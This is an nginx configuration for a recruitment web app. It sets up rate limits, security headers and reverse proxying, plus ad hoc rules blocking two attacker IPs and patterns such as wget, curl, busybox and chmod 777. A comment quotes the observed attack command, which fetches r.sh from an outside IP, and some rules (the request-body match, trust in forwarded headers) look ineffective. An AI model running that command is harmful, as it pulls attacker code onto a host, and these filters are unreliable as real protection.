events { worker_connections 1024; }

http {
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;

  sendfile on;
  tcp_nopush on;
  keepalive_timeout 300;
  client_max_body_size 25m;

  # Rate limiting zones - BLOCKS MALWARE ATTACKS
  limit_req_zone $binary_remote_addr zone=general:10m rate=30r/s;
  limit_req_zone $binary_remote_addr zone=api:10m rate=20r/s;
  limit_req_zone $binary_remote_addr zone=strict:10m rate=5r/s;
  
  # Connection limiting - PREVENTS DDOS
  limit_conn_zone $binary_remote_addr zone=addr:10m;
  limit_conn addr 20;

  map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
  }

  upstream frontend { server ubuntu_frontend_1:3000; }
  upstream backend  { server ubuntu_backend_1:8000; }

  server {
    listen 80;
    server_name alphacv.alphadatarecruitment.ae localhost;

    # ============================================
    # PERMANENT MALWARE PROTECTION - BLOCKS AT ENTRY POINT
    # ============================================
    
    # Get real client IP (handles proxies/load balancers)
    set $real_ip $remote_addr;
    if ($http_x_forwarded_for) {
      set $real_ip $http_x_forwarded_for;
    }
    if ($http_x_real_ip) {
      set $real_ip $http_x_real_ip;
    }
    
    # Block requests from known malware IPs (FIRST LINE OF DEFENSE)
    # Check both remote_addr and forwarded headers
    set $block_ip 0;
    if ($remote_addr ~* "(89\.144\.31\.18|176\.117\.107\.158)") {
      set $block_ip 1;
    }
    if ($real_ip ~* "(89\.144\.31\.18|176\.117\.107\.158)") {
      set $block_ip 1;
    }
    if ($http_x_forwarded_for ~* "(89\.144\.31\.18|176\.117\.107\.158)") {
      set $block_ip 1;
    }
    if ($block_ip = 1) {
      return 403;
    }
    
    # Block suspicious patterns in URI (blocks attack URLs)
    if ($request_uri ~* "(busybox|x86|nuts|bolts|89\.144\.31\.18|176\.117\.107\.158|r\.sh|malware|exploit|shell|mkdir.*tmp|chmod.*777)") {
      return 403;
    }
    
    # Block shell command injection in query string
    if ($query_string ~* "(bash|sh|cmd|exec|system|eval|wget|curl|r\.sh|176\.117\.107\.158|mkdir|chmod.*777)") {
      return 403;
    }
    
    # Block attack command patterns in request body (for POST/PUT)
    # This catches the exact attack: mkdir /tmp;cd /tmp;wget http://176.117.107.158/r.sh
    if ($request_body ~* "(mkdir.*tmp|wget.*176\.117\.107\.158|curl.*176\.117\.107\.158|r\.sh|chmod.*777)") {
      return 403;
    }
    
    # Block suspicious patterns in headers
    if ($http_referer ~* "(176\.117\.107\.158|89\.144\.31\.18|r\.sh)") {
      return 403;
    }
    
    # Block malicious user agents (wget, curl, scanners from ANY IP)
    # BUT allow curl/wget from internal network for monitoring
    set $block_ua 0;
    if ($http_user_agent ~* "(wget|curl|scanner|bot|malware|nikto|sqlmap|nmap|masscan)") {
      set $block_ua 1;
    }
    # Allow from internal Docker network (172.16-31.x.x)
    if ($remote_addr ~* "^172\.(1[6-9]|2[0-9]|3[0-1])\.") {
      set $block_ua 0;
    }
    # Allow from localhost
    if ($remote_addr ~* "^127\.0\.0\.1$") {
      set $block_ua 0;
    }
    if ($block_ua = 1) {
      return 403;
    }

    # Security headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    
    # CSP - adjust based on your needs
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' data: https://fonts.gstatic.com; connect-src 'self' https://api.openai.com; frame-ancestors 'self';" always;

    location = /api {
      return 301 /api/;
    }

    location /api/ {
      # Rate limiting for API - PREVENTS ABUSE
      limit_req zone=api burst=50 nodelay;
      
      proxy_pass http://backend;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      # INCREASED TIMEOUTS for large batch matching (was 1200s, now 1800s = 30 minutes)
      proxy_read_timeout 1800s;
      proxy_send_timeout 1800s;
      proxy_connect_timeout 60s;
      proxy_request_buffering off;
      proxy_buffering off;
      client_max_body_size 25m;
      proxy_max_temp_file_size 0;
    }

    location = /health {
      proxy_pass http://backend/api/health;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /docs {
      proxy_pass http://backend/docs;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }
    
    location = /redoc {
      proxy_pass http://backend/redoc;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Static assets (JS/CSS/images) - cache with long expiry (Next.js uses content hashes)
    location ~* \.(js|css|woff|woff2|ttf|eot|svg|png|jpg|jpeg|gif|ico|webp)$ {
      proxy_pass http://frontend;
      proxy_set_header Host $host;
      expires 1y;
      add_header Cache-Control "public, immutable";
      add_header X-Content-Type-Options "nosniff";
    }
    
    # HTML and all other routes - don't cache (so users get latest JS references)
    location / {
      # Rate limiting for frontend - PREVENTS MALWARE ATTACKS
      limit_req zone=general burst=100 nodelay;
      
      proxy_pass http://frontend;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_read_timeout 1200s;
      proxy_send_timeout 1200s;
      proxy_connect_timeout 60s;
      
      # Don't cache HTML - always fetch latest
      add_header Cache-Control "no-cache, no-store, must-revalidate";
      add_header Pragma "no-cache";
      add_header Expires "0";
    }
  }
}
